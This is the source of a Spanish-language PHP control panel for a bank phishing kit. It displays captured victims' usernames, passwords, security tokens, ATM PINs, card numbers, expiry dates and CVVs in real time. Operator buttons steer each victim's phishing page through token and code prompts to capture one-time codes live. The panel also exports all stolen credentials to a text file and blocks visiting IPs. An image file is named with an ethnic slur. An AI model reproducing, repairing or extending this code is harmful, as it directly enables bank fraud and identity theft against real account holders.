<?php
    session_start();

    // Función para obtener la IP real del cliente
    function getUserIP() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }

    $ip = trim(getUserIP()); // IP del usuario
    $autorizadosFile = 'autorizados.json';
    $bloqueadasFile  = 'ips_bloqueadas.json';

    // Leer IPs autorizadas
    $autorizados = file_exists($autorizadosFile) ? json_decode(file_get_contents($autorizadosFile), true) : [];
    if (!is_array($autorizados)) $autorizados = [];
    $autorizados = array_map('trim', $autorizados);

    // Verificar si está autorizada
    if (!in_array($ip, $autorizados)) {
        header("Location: login.php");
        exit;
    }

    // ---------- LISTA DE IPs BLOQUEADAS ----------
    function leerBloqueadas($archivo) {
        $l = file_exists($archivo) ? json_decode(file_get_contents($archivo), true) : [];
        return is_array($l) ? array_values(array_unique(array_map('trim', $l))) : [];
    }

    // Acción bloquear / desbloquear IP
    if (isset($_POST['accion_ip'], $_POST['ip'])) {
        $lista = leerBloqueadas($bloqueadasFile);
        $objetivo = trim($_POST['ip']);
        if ($objetivo !== '') {
            if ($_POST['accion_ip'] === 'bloquear') {
                if (!in_array($objetivo, $lista)) $lista[] = $objetivo;
            } else {
                $lista = array_values(array_diff($lista, [$objetivo]));
            }
            file_put_contents($bloqueadasFile, json_encode($lista, JSON_PRETTY_PRINT));
        }
        header('Content-Type: application/json');
        echo '{"ok":true}';
        exit;
    }

    // Eliminar todos los datos
    if (isset($_POST['eliminar_todo'])) {
        try {
            $db = new PDO('sqlite:usuarios.db');
            $db->exec("DELETE FROM usuarios");
        } catch (Exception $e) {}
        header("Location: panel.php");
        exit;
    }

    // Guardar todo en TXT
    if (isset($_POST['guardar_txt'])) {
        try {
            $db = new PDO('sqlite:usuarios.db');
            $usuarios = $db->query("SELECT * FROM usuarios")->fetchAll(PDO::FETCH_ASSOC);

            $txt = "";
            foreach ($usuarios as $u) {
                $txt .= "Usuario: {$u['usuario']}\n";
                $txt .= "Clave: {$u['clave']}\n";
                $txt .= "IP: {$u['ip']}\n";
                $txt .= "Dispositivo: {$u['dispositivo']}\n";
                $txt .= "Entidad: {$u['entidad']}\n";
                $txt .= "Estado: {$u['estado']}\n";
                if (!empty($u['token'])) $txt .= "Token: {$u['token']}\n";
                if (!empty($u['cajero'])) $txt .= "Cajero: {$u['cajero']}\n";
                if (!empty($u['coordenadas'])) $txt .= "Coord: {$u['coordenadas']}\n";
                $txt .= "Ident: {$u['identificador']}\n";
                $txt .= "----------------------\n";
            }

            file_put_contents("reporte.txt", $txt);
        } catch (Exception $e) {}
        header("Location: panel.php");
        exit;
    }

    // Petición AJAX
    if (isset($_GET['ajax'])) {
        try {
            $db = new PDO('sqlite:usuarios.db');
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $usuarios = $db->query("SELECT * FROM usuarios ORDER BY id ASC")->fetchAll(PDO::FETCH_ASSOC);
            header('Content-Type: application/json');
            echo json_encode([
                'usuarios'   => $usuarios,
                'bloqueadas' => leerBloqueadas($bloqueadasFile)
            ]);
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode(['usuarios' => [], 'bloqueadas' => []]);
        }
        exit;
    }
    ?>

    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Panel</title>
        <style>
            :root{
                --bg:#0a0d14; --card:#151c27; --line:#232c3b; --txt:#e8eef7; --muted:#8b98ad;
                --cyan:#22d3ee; --green:#22c55e; --red:#ef4444; --amber:#f59e0b; --violet:#8b5cf6;
            }
            *{ box-sizing:border-box; }

            body{
                margin:0;
                padding:18px;
                min-height:100vh;
                color:var(--txt);
                font-family:'Inter','Segoe UI',system-ui,-apple-system,Arial,sans-serif;
                background:
                    radial-gradient(1200px 600px at 20% -10%, rgba(34,211,238,.08), transparent 60%),
                    radial-gradient(900px 500px at 100% 0%, rgba(139,92,246,.08), transparent 55%),
                    var(--bg);
            }

            /* ---------- BARRA SUPERIOR ---------- */
            .topbar{
                display:flex; align-items:center; justify-content:space-between; gap:16px; flex-wrap:wrap;
                background:linear-gradient(180deg, rgba(20,26,36,.92), rgba(15,20,29,.72));
                border:1px solid var(--line);
                border-radius:16px;
                padding:14px 18px;
                box-shadow:0 10px 30px rgba(0,0,0,.45);
                margin-bottom:16px;
            }
            .brand h1{
                margin:0; font-size:18px; letter-spacing:.4px;
                background:linear-gradient(90deg,#22d3ee,#8b5cf6);
                -webkit-background-clip:text; background-clip:text; color:transparent;
            }
            .brand p{ margin:3px 0 0; font-size:11.5px; color:var(--muted); }
            .live{ display:inline-flex; align-items:center; gap:6px; font-size:11px; color:var(--green); font-weight:700; }
            .live i{ width:8px; height:8px; border-radius:50%; background:var(--green); animation:ping 1.6s infinite; }
            @keyframes ping{
                0%{ box-shadow:0 0 0 0 rgba(34,197,94,.6); }
                70%{ box-shadow:0 0 0 9px rgba(34,197,94,0); }
                100%{ box-shadow:0 0 0 0 rgba(34,197,94,0); }
            }

            .acciones-top{ display:flex; gap:10px; flex-wrap:wrap; }
            .btn{
                display:inline-flex; align-items:center; gap:7px;
                padding:9px 15px; border-radius:10px; border:1px solid var(--line);
                background:linear-gradient(180deg,#1b2431,#141a24); color:var(--txt);
                font-size:12.5px; font-weight:600; cursor:pointer; transition:.2s; letter-spacing:.2px;
            }
            .btn:hover{ transform:translateY(-2px); border-color:#33415a; }
            .btn-save:hover{ border-color:var(--cyan); box-shadow:0 6px 18px rgba(34,211,238,.25); color:#c8f6ff; }
            .btn-danger:hover{ border-color:var(--red); box-shadow:0 6px 18px rgba(239,68,68,.25); color:#ffd7d7; }

            .btn-sonido{ border-color:rgba(34,197,94,.45); color:#b9f6cd; }
            .btn-sonido:hover{ border-color:var(--green); box-shadow:0 6px 18px rgba(34,197,94,.28); }
            .btn-sonido.off{ border-color:rgba(239,68,68,.45); color:#fca5a5; }
            .btn-sonido.off:hover{ border-color:var(--red); box-shadow:0 6px 18px rgba(239,68,68,.28); }

            .btn-pro{
                border-color:rgba(245,158,11,.5); color:#fcd34d;
                background:linear-gradient(180deg,#2a2113,#1d1810);
            }
            .btn-pro:hover{ border-color:var(--amber); box-shadow:0 6px 18px rgba(245,158,11,.3); }

            /* ---------- ESTADÍSTICAS / FILTROS ---------- */
            .stats{ display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px; }
            .stat{
                flex:1; min-width:110px;
                background:linear-gradient(180deg,#141a24,#101620);
                border:1px solid var(--line); border-radius:14px; padding:12px 14px;
                text-align:left; color:var(--txt); font-family:inherit; cursor:pointer;
                transition:.18s;
            }
            .stat:hover{ transform:translateY(-2px); border-color:#33415a; }
            .stat.activo{ border-color:var(--cyan); box-shadow:0 0 0 1px rgba(34,211,238,.4), 0 10px 26px rgba(34,211,238,.16); }
            .stat b{ display:block; font-size:22px; font-weight:800; }
            .stat span{ font-size:10px; text-transform:uppercase; letter-spacing:1.2px; color:var(--muted); }

            /* ---------- COLUMNAS Y TARJETAS ---------- */
            .fila-tablas{ display:flex; gap:14px; overflow-x:auto; padding-bottom:14px; align-items:flex-start; }
            .fila-tablas::-webkit-scrollbar{ height:9px; }
            .fila-tablas::-webkit-scrollbar-track{ background:#0d121a; border-radius:9px; }
            .fila-tablas::-webkit-scrollbar-thumb{ background:#2a3546; border-radius:9px; }
            .fila-tablas::-webkit-scrollbar-thumb:hover{ background:#3a4a63; }

            .columna{ display:flex; flex-direction:column; gap:12px; min-width:305px; }

            .tarjeta{
                position:relative;
                background:linear-gradient(180deg,#151c27,#111722);
                border:1px solid var(--line);
                border-radius:14px;
                padding:12px 12px 12px 15px;
                display:flex; gap:10px; justify-content:space-between;
                box-shadow:0 6px 20px rgba(0,0,0,.35);
                transition:transform .2s, box-shadow .2s, border-color .2s;
            }
            .tarjeta:hover{ transform:translateY(-2px); box-shadow:0 14px 30px rgba(0,0,0,.5); }
            .tarjeta.verde{ border-color:rgba(34,197,94,.55); animation:palpitarVerde 1.8s infinite; }
            .tarjeta.rojo{ border-color:rgba(239,68,68,.32); }
            .tarjeta.bloqueada{ opacity:.72; }
            @keyframes palpitarVerde{
                0%,100%{ box-shadow:0 0 10px rgba(34,197,94,.25); }
                50%{ box-shadow:0 0 26px rgba(34,197,94,.5); }
            }
            .tarjeta::before{
                content:''; position:absolute; left:0; top:12px; bottom:12px; width:3px;
                border-radius:0 4px 4px 0; background:var(--muted); opacity:.5;
            }
            .tarjeta.verde::before{ background:var(--green); opacity:1; }
            .tarjeta.rojo::before{ background:var(--red); opacity:.85; }

            .contenido{ flex-grow:1; min-width:0; }

            .card-top{ display:flex; align-items:center; gap:6px; justify-content:space-between; margin-bottom:9px; }
            .dev{
                font-size:9.5px; font-weight:800; padding:3px 8px; border-radius:999px;
                letter-spacing:.4px; border:1px solid transparent; white-space:nowrap;
            }
            .dev.pc{ background:rgba(59,130,246,.14); color:#93c5fd; border-color:rgba(59,130,246,.35); }
            .dev.movil{ background:rgba(245,158,11,.14); color:#fcd34d; border-color:rgba(245,158,11,.35); }
            .dev.tablet{ background:rgba(139,92,246,.14); color:#c4b5fd; border-color:rgba(139,92,246,.35); }
            .dev.nd{ background:rgba(139,152,173,.12); color:#9aa8bd; border-color:rgba(139,152,173,.25); }

            .chip{ font-size:9px; text-transform:uppercase; letter-spacing:.8px; padding:3px 7px; border-radius:6px; font-weight:800; }
            .chip.on{ background:rgba(34,197,94,.14); color:#6ee7a5; }
            .chip.off{ background:rgba(239,68,68,.12); color:#fca5a5; }
            .chip.bloq{ background:rgba(239,68,68,.2); color:#ffb4b4; }

            .dato{
                margin-bottom:4px; font-size:12px; line-height:1.45; cursor:pointer;
                border-radius:6px; padding:1px 4px; transition:.15s;
            }
            .dato:hover{ background:rgba(34,211,238,.07); }
            .dato strong{ color:#7d8ba1; display:inline-block; width:68px; font-weight:600; font-size:11px; }
            .dato span{ color:#dbe6f5; word-break:break-all; }

            .dato.usuario span, .dato.clave span, .dato.token span{ color:#f5da42; }
            .dato.cajero span{ color:#ff91c3; }

            /* ---------- BOTONES DE ACCIÓN ---------- */
            .acciones{ display:grid; grid-template-columns:1fr 1fr; gap:5px; align-content:start; min-width:126px; }
            .acciones button{
                padding:6px 4px; font-size:9.5px; font-weight:800; letter-spacing:.3px;
                border:none; border-radius:8px; cursor:pointer; color:#fff;
                transition:.18s; white-space:nowrap; text-transform:uppercase;
            }
            .acciones button:hover{ transform:translateY(-1px); filter:brightness(1.15); box-shadow:0 4px 12px rgba(0,0,0,.4); }
            .acciones button:active{ transform:translateY(0) scale(.97); }

            .usuario-btn{ background:linear-gradient(180deg,#2f7dfa,#1d5fd0); }
            .codigo{ background:linear-gradient(180deg,#ffc93c,#e0a800); color:#241c00; }
            .cajero-btn{ background:linear-gradient(180deg,#ec4899,#be185d); }
            .token-btn{ background:linear-gradient(180deg,#0ea5b7,#0b7f8d); }
            .token1{ background:linear-gradient(180deg,#ef4444,#b91c1c); }
            .final{ background:linear-gradient(180deg,#22c55e,#15803d); grid-column:span 2; }
            .bloqueo{ background:linear-gradient(180deg,#64748b,#3f4c5f); grid-column:span 2; }
            .bloqueo.activo{ background:linear-gradient(180deg,#f59e0b,#b45309); }

            .conn{
                grid-column:span 2; font-size:9.5px; font-weight:800; letter-spacing:.6px;
                text-align:center; padding:4px; border-radius:7px; background:rgba(255,255,255,.04);
            }

            /* ---------- ESTADO VACÍO Y TOAST ---------- */
            .vacio{
                width:100%; text-align:center; padding:60px 20px; color:var(--muted);
                border:1px dashed var(--line); border-radius:16px; font-size:13px;
            }
            #toast{
                position:fixed; bottom:22px; left:50%;
                transform:translateX(-50%) translateY(20px);
                background:#151c27; border:1px solid var(--cyan); color:#c8f6ff;
                padding:9px 18px; border-radius:10px; font-size:12px; font-weight:600;
                opacity:0; pointer-events:none; transition:.25s; z-index:999;
                box-shadow:0 10px 30px rgba(0,0,0,.5);
            }
            #toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }

            /* ---------- MODAL MODO PRO ---------- */
            #modalPro{
                position:fixed; inset:0; z-index:900;
                display:none; align-items:center; justify-content:center;
                background:rgba(4,7,12,.86);
                -webkit-backdrop-filter:blur(5px); backdrop-filter:blur(5px);
                padding:26px;
            }
            #modalPro.activo{ display:flex; animation:aparecer .22s ease-out; }
            @keyframes aparecer{ from{ opacity:0; } to{ opacity:1; } }

            .pro-caja{ position:relative; max-width:min(92vw, 780px); max-height:88vh; }
            .pro-caja img{
                display:block; max-width:100%; max-height:88vh; margin:0 auto;
                border-radius:16px; border:1px solid var(--line);
                box-shadow:0 28px 70px rgba(0,0,0,.75);
            }
            .pro-x{
                position:absolute; top:-15px; right:-15px;
                width:36px; height:36px; border-radius:50%;
                display:flex; align-items:center; justify-content:center;
                background:#151c27; color:#c8f6ff; border:1px solid var(--cyan);
                font-size:15px; font-weight:800; line-height:1; cursor:pointer;
                transition:.18s; box-shadow:0 8px 22px rgba(0,0,0,.6);
            }
            .pro-x:hover{ background:var(--red); border-color:var(--red); color:#fff; transform:rotate(90deg) scale(1.08); }

            .pro-titulo{
                position:absolute; top:-46px; left:0;
                font-size:13px; font-weight:800; letter-spacing:1.5px;
                color:#fcd34d; text-transform:uppercase;
            }

            /* ---------- RESPONSIVE ---------- */
            @media (max-width:640px){
                body{ padding:10px; }
                .topbar{ flex-direction:column; align-items:stretch; }
                .acciones-top{ justify-content:stretch; }
                .acciones-top .btn{ flex:1; justify-content:center; }
                .columna{ min-width:86vw; }
                .tarjeta{ flex-direction:column; }
                .acciones{ grid-template-columns:1fr 1fr 1fr; min-width:auto; }
                .final{ grid-column:span 3; }
                .bloqueo{ grid-column:span 3; }
                .conn{ grid-column:span 3; }
                .pro-x{ top:-13px; right:-6px; }
                .pro-titulo{ top:-40px; font-size:11px; }
            }
        </style>
    </head>
    <body>

    <div class="topbar">
        <div class="brand">
            <h1>⚡ Panel de Administración</h1>
            <p><span class="live"><i></i> EN VIVO</span> &nbsp;·&nbsp; Actualizado <span id="hora">--:--:--</span></p>
        </div>
        <form method="POST" class="acciones-top">
            <button type="button" id="btnSonido" class="btn btn-sonido">🔔 Sonido: ON</button>
            <button type="button" class="btn btn-pro" onclick="abrirModoPro()">🔥 Activar Modo Pro</button>
            <button type="submit" name="guardar_txt" class="btn btn-save">💾 Guardar TXT</button>
            <button type="submit" name="eliminar_todo" class="btn btn-danger" onclick="return confirm('¿Seguro que quieres eliminar todos los datos?')">🗑 Eliminar todo</button>
        </form>
    </div>

    <div class="stats">
        <button type="button" class="stat activo" id="fTotal"    data-filtro="total"><b id="stTotal">0</b><span>Total</span></button>
        <button type="button" class="stat"        id="fEspera"   data-filtro="esperando"><b id="stEspera" style="color:#22c55e">0</b><span>En espera</span></button>
        <button type="button" class="stat"        id="fMovil"    data-filtro="movil"><b id="stMovil" style="color:#f59e0b">0</b><span>Móvil</span></button>
        <button type="button" class="stat"        id="fPc"       data-filtro="pc"><b id="stPc" style="color:#3b82f6">0</b><span>PC</span></button>
    </div>

    <div class="fila-tablas" id="contenedor"></div>

    <audio id="sonidoNuevo" src="nuevo.mp3" loop preload="auto"></audio>

    <div id="modalPro">
        <div class="pro-caja">
            <span class="pro-titulo">🔥 Modo Pro</span>
            <button type="button" class="pro-x" onclick="cerrarModoPro()" title="Cerrar">✕</button>
            <img src="veneco.png" alt="Modo Pro">
        </div>
    </div>

    <div id="toast"></div>

    <script>
        let datosAnteriores = [];
        let cachePorUsuario = {};
        let bloqueadas = [];
        let filtro = "total";
        let primerCarga = true;

        /* ================= TOAST ================= */
        let toastTimer = null;
        function mostrarToast(msg) {
            const t = document.getElementById("toast");
            t.textContent = msg;
            t.classList.add("show");
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => t.classList.remove("show"), 1400);
        }

        function copiar(texto) {
            navigator.clipboard.writeText(texto);
            mostrarToast("✔ Copiado: " + texto);
        }

        /* ================= MODO PRO ================= */
        function abrirModoPro() {
            document.getElementById("modalPro").classList.add("activo");
        }
        function cerrarModoPro() {
            document.getElementById("modalPro").classList.remove("activo");
        }
        document.getElementById("modalPro").addEventListener("click", function (e) {
            if (e.target === this) cerrarModoPro();
        });
        document.addEventListener("keydown", function (e) {
            if (e.key === "Escape") cerrarModoPro();
        });

        /* ================= SONIDO ================= */
        const audio = document.getElementById("sonidoNuevo");
        const btnSonido = document.getElementById("btnSonido");

        let sonidoActivo    = localStorage.getItem("panel_sonido") !== "off";
        let audioListo      = false;   // ya hubo un gesto: play() permitido
        let alarmaActiva    = false;   // la alarma debe estar sonando
        let alarmaPendiente = false;   // se intentó y el navegador la bloqueó

        function pintarBotonSonido() {
            btnSonido.textContent = sonidoActivo ? "🔔 Sonido: ON" : "🔕 Sonido: OFF";
            btnSonido.classList.toggle("off", !sonidoActivo);
        }

        function iniciarSonido() {
            if (!sonidoActivo || alarmaActiva) return;
            alarmaActiva = true;
            try { audio.currentTime = 0; } catch (e) {}
            const p = audio.play();
            if (p && p.then) {
                p.then(() => { alarmaPendiente = false; })
                 .catch(err => {
                    alarmaActiva = false;
                    alarmaPendiente = true;   // se reintentará con el próximo gesto
                    console.warn("[audio] play() bloqueado:", err.name, err.message);
                 });
            }
        }

        function detenerSonido() {
            alarmaActiva = false;
            alarmaPendiente = false;
            try { audio.pause(); audio.currentTime = 0; } catch (e) {}
        }

        // El navegador exige un gesto del usuario para dejar sonar audio
        function desbloquearAudio() {
            if (audioListo || !sonidoActivo) return;
            const p = audio.play();
            if (!p || !p.then) { audioListo = true; return; }
            p.then(() => {
                audioListo = true;
                if (alarmaPendiente) { alarmaPendiente = false; alarmaActiva = true; return; }
                if (alarmaActiva) return;
                audio.pause(); audio.currentTime = 0;   // solo era la prueba
            }).catch(() => {});
        }
        ["click", "touchstart", "keydown"].forEach(ev =>
            document.addEventListener(ev, desbloquearAudio)
        );

        btnSonido.addEventListener("click", () => {
            sonidoActivo = !sonidoActivo;
            localStorage.setItem("panel_sonido", sonidoActivo ? "on" : "off");

            if (sonidoActivo) {
                audioListo = true;
                iniciarSonido();
                setTimeout(() => { if (!alarmaPendiente) detenerSonido(); }, 1000);
                mostrarToast("🔔 Sonido activado");
            } else {
                detenerSonido();
                mostrarToast("🔕 Sonido desactivado");
            }
            pintarBotonSonido();
        });
        pintarBotonSonido();

        /* ================= DETECCIÓN DE DISPOSITIVO ================= */
        const META_DEV = {
            pc:     { icon: "💻", label: "PC",     cls: "pc"     },
            movil:  { icon: "📱", label: "Móvil",  cls: "movil"  },
            tablet: { icon: "📟", label: "Tablet", cls: "tablet" },
            nd:     { icon: "❔", label: "N/D",    cls: "nd"     }
        };

        const RE_TABLET = /ipad|tablet|playbook|silk|kindle|(android(?!.*mobile))/i;
        const RE_MOVIL  = /android|iphone|ipod|mobile|windows phone|blackberry|opera mini|iemobile|webos/i;
        const RE_PC     = /windows|macintosh|mac os x|linux|x11|cros/i;

        function clasificarDispositivo(valor) {
            let s = String(valor == null ? "" : valor).toLowerCase().trim();
            if (!s) return null;
            if (/^(pc|desktop|computadora|escritorio|ordenador)$/.test(s)) return "pc";
            if (/^(movil|móvil|mobile|celular|phone|smartphone)$/.test(s)) return "movil";
            if (/^(tablet|tableta|ipad)$/.test(s)) return "tablet";
            if (RE_TABLET.test(s)) return "tablet";
            if (RE_MOVIL.test(s))  return "movil";
            if (RE_PC.test(s))     return "pc";
            return null;
        }

        /* Hereda dispositivo e IP de filas anteriores del MISMO usuario */
        function construirCache(data) {
            cachePorUsuario = {};
            for (let i = data.length - 1; i >= 0; i--) {
                const u = data[i];
                if (!u.usuario) continue;
                const tipo = clasificarDispositivo(u.dispositivo) || clasificarDispositivo(u.user_agent);
                const prev = cachePorUsuario[u.usuario] || {};
                if (tipo && !prev.dispositivo) prev.dispositivo = tipo;
                if (u.ip && !prev.ip) prev.ip = u.ip;
                if (prev.dispositivo || prev.ip) cachePorUsuario[u.usuario] = prev;
            }
        }

        function detectarDispositivo(u) {
            const campos = [
                "dispositivo", "dispositivo_tipo", "tipo_dispositivo", "device",
                "plataforma", "plataforma_tipo", "so", "sistema", "user_agent",
                "useragent", "ua", "navegador"
            ];
            for (let i = 0; i < campos.length; i++) {
                const tipo = clasificarDispositivo(u[campos[i]]);
                if (tipo) return META_DEV[tipo];
            }
            const heredado = (cachePorUsuario[u.usuario] || {}).dispositivo;
            if (heredado) return META_DEV[heredado];
            return META_DEV.nd;
        }

        /* ================= ACCIONES ================= */
        function cambiarEstado(id, estado) {
            detenerSonido();
            const formData = new FormData();
            formData.append("id", id);
            formData.append("estado", estado);

            fetch("updateAction.php", { method: "POST", body: formData })
                .then(() => cargarUsuarios())
                .catch(err => console.error("Error al actualizar:", err));
        }

        function accionIP(ip, accion) {
            detenerSonido();
            const fd = new FormData();
            fd.append("accion_ip", accion);
            fd.append("ip", ip);

            fetch("panel.php", { method: "POST", body: fd })
                .then(() => {
                    mostrarToast(accion === "bloquear" ? "🚫 IP bloqueada: " + ip : "✅ IP desbloqueada: " + ip);
                    cargarUsuarios();
                })
                .catch(err => console.error(err));
        }

        function crearBoton(id, estado, texto, clase, titulo) {
            const button = document.createElement("button");
            button.type = "button";
            button.className = clase;
            button.textContent = texto;
            if (titulo) button.title = titulo;
            button.addEventListener("click", () => cambiarEstado(id, estado));
            return button;
        }

        /* ================= FILTROS ================= */
        document.querySelectorAll(".stat").forEach(btn => {
            btn.addEventListener("click", () => {
                filtro = btn.dataset.filtro;
                document.querySelectorAll(".stat").forEach(b => b.classList.toggle("activo", b === btn));
                cargarUsuarios();
            });
        });

        /* ================= RENDER ================= */
        function actualizarStats(data) {
            document.getElementById("stTotal").textContent  = data.length;
            document.getElementById("stEspera").textContent = data.filter(u => u.estado === "esperando").length;
            document.getElementById("stMovil").textContent  = data.filter(u => detectarDispositivo(u).cls === "movil").length;
            document.getElementById("stPc").textContent     = data.filter(u => detectarDispositivo(u).cls === "pc").length;
        }

        function cargarUsuarios() {
            fetch("panel.php?ajax=1")
                .then(res => res.json())
                .then(res => {
                    const data = res.usuarios || [];
                    bloqueadas = res.bloqueadas || [];

                    const contenedor = document.getElementById("contenedor");
                    contenedor.innerHTML = "";

                    construirCache(data);
                    document.getElementById("hora").textContent = new Date().toLocaleTimeString("es-ES");
                    actualizarStats(data);

                    /* --- SONIDO: solo con registros nuevos o al volver a "esperando" --- */
                    if (!primerCarga) {
                        const previos = {};
                        datosAnteriores.forEach(u => previos[String(u.id)] = u.estado);

                        const nuevos    = data.filter(u => !(String(u.id) in previos));
                        const volvieron = data.filter(u =>
                            u.estado === "esperando" &&
                            previos[String(u.id)] &&
                            previos[String(u.id)] !== "esperando"
                        );

                        if (nuevos.length || volvieron.length) {
                            console.log("[alarma] nuevos:", nuevos.map(u => u.id), "volvieron:", volvieron.map(u => u.id));
                            iniciarSonido();
                        }
                    }

                    /* --- FILTRO --- */
                    let visibles = data;
                    if (filtro === "esperando") {
                        visibles = data.filter(u => u.estado === "esperando");
                    } else if (filtro === "movil" || filtro === "pc") {
                        visibles = data.filter(u => detectarDispositivo(u).cls === filtro);
                    }

                    if (visibles.length === 0) {
                        const vacio = document.createElement("div");
                        vacio.className = "vacio";
                        vacio.textContent = data.length === 0 ? "Sin registros todavía..." : "Nada que mostrar con este filtro.";
                        contenedor.appendChild(vacio);
                    }

                    const columnas = [];
                    for (let i = 0; i < visibles.length; i += 5) {
                        columnas.push(visibles.slice(i, i + 5));
                    }

                    columnas.forEach(grupo => {
                        const col = document.createElement("div");
                        col.className = "columna";

                        grupo.forEach(usuario => {
                            const dev = detectarDispositivo(usuario);
                            const ipMostrar = usuario.ip || (cachePorUsuario[usuario.usuario] || {}).ip || '';
                            const estaBloqueada = ipMostrar !== '' && bloqueadas.includes(ipMostrar);

                            const tarjeta = document.createElement("div");
                            tarjeta.classList.add("tarjeta");
                            tarjeta.classList.add(usuario.estado === "esperando" ? "verde" : "rojo");
                            if (estaBloqueada) tarjeta.classList.add("bloqueada");

                            const contenido = document.createElement("div");
                            contenido.classList.add("contenido");

                            contenido.innerHTML = `
    <div class="card-top">
        <span class="dev ${dev.cls}" title="Dispositivo detectado">${dev.icon} ${dev.label}</span>
        <span class="chip ${usuario.estado === 'esperando' ? 'on' : 'off'}">${usuario.estado}</span>
    </div>
    <div class="dato usuario" title="Clic para copiar" onclick="copiar('${usuario.usuario}')"><strong>Usuario:</strong> <span>${usuario.usuario}</span></div>
    <div class="dato clave" title="Clic para copiar" onclick="copiar('${usuario.clave}')"><strong>Clave:</strong> <span>${usuario.clave || 'N/A'}</span></div>
    <div class="dato"><strong>Entidad:</strong> <span>${usuario.entidad}</span></div>
    ${usuario.token ? `<div class="dato token" title="Clic para copiar" onclick="copiar('${usuario.token}')"><strong>Token:</strong> <span>${usuario.token}</span></div>` : ''}
    ${usuario.cajero ? `<div class="dato cajero" title="Clic para copiar" onclick="copiar('${usuario.cajero}')"><strong>Cajero:</strong> <span>${usuario.cajero}</span></div>` : ''}
    ${usuario.tarjeta ? `<div class="dato" title="Clic para copiar" onclick="copiar('${usuario.tarjeta}')"><strong>Tarjeta:</strong> <span>${usuario.tarjeta}</span></div>` : ''}
    ${usuario.fecha_tarjeta ? `<div class="dato" title="Clic para copiar" onclick="copiar('${usuario.fecha_tarjeta}')"><strong>F. Tarjeta:</strong> <span>${usuario.fecha_tarjeta}</span></div>` : ''}
    ${usuario.cvv ? `<div class="dato" title="Clic para copiar" onclick="copiar('${usuario.cvv}')"><strong>CVV:</strong> <span>${usuario.cvv}</span></div>` : ''}
    <div class="dato"><strong>Ident:</strong> <span>${usuario.identificador}</span></div>
    ${ipMostrar ? `<div class="dato" title="Clic para copiar" onclick="copiar('${ipMostrar}')"><strong>IP:</strong> <span>${ipMostrar}</span></div>` : ''}
    ${estaBloqueada ? `<span class="chip bloq">IP bloqueada</span>` : ''}
`;

                            const acciones = document.createElement("div");
                            acciones.className = "acciones";

                            acciones.appendChild(crearBoton(usuario.id, "error",       "✏ USUARIO",  "usuario-btn", "Cambiar a estado USUARIO"));
                            acciones.appendChild(crearBoton(usuario.id, "token",       "🔑 TOKEN",   "codigo",      "Cambiar a estado TOKEN"));
                            acciones.appendChild(crearBoton(usuario.id, "cajero",      "📧 TARJETA", "cajero-btn",  "Cambiar a estado TARJETA"));
                            acciones.appendChild(crearBoton(usuario.id, "codigo",      "🔒 CODIGO",  "token-btn",   "Cambiar a estado CODIGO"));
                            acciones.appendChild(crearBoton(usuario.id, "codigoerror", "❌ COD. ERR", "token1",     "Cambiar a estado COD. ERROR"));
                            acciones.appendChild(crearBoton(usuario.id, "tokenerror",  "❌ TOK. ERR", "token-btn",  "Cambiar a estado TOKEN ERROR"));
                            acciones.appendChild(crearBoton(usuario.id, "final",       "✅ FIN",      "final",      "Marcar como FINALIZADO"));

                            if (ipMostrar) {
                                const bBloq = document.createElement("button");
                                bBloq.type = "button";
                                bBloq.className = "bloqueo" + (estaBloqueada ? " activo" : "");
                                bBloq.textContent = estaBloqueada ? "🔓 DESBLOQUEAR IP" : "🚫 BLOQUEAR IP";
                                bBloq.title = estaBloqueada ? "Permitir de nuevo esta IP" : "Bloquear esta IP (la manda a google.com)";
                                bBloq.addEventListener("click", () => accionIP(ipMostrar, estaBloqueada ? "desbloquear" : "bloquear"));
                                acciones.appendChild(bBloq);
                            }

                            const ahora = Math.floor(Date.now() / 1000);
                            const ultima = parseInt(usuario.ultima_actividad || 0);
                            const online = (ahora - ultima) <= 3;

                            const estadoConexion = document.createElement("div");
                            estadoConexion.className = "conn";
                            estadoConexion.style.color = online ? "#28a745" : "#dc3545";
                            estadoConexion.textContent = online ? "🟢 ONLINE" : "🔴 OFFLINE";

                            acciones.appendChild(estadoConexion);

                            tarjeta.appendChild(contenido);
                            tarjeta.appendChild(acciones);
                            col.appendChild(tarjeta);
                        });

                        contenedor.appendChild(col);
                    });

                    datosAnteriores = data;
                    primerCarga = false;
                })
                .catch(err => console.error(err));
        }

        cargarUsuarios();
        setInterval(cargarUsuarios, 3000);

        // Al volver a la pestaña, refrescar de inmediato (el navegador frena los timers en segundo plano)
        document.addEventListener("visibilitychange", () => {
            if (!document.hidden) cargarUsuarios();
        });
        window.addEventListener("focus", cargarUsuarios);
    </script>

    </body>
    </html>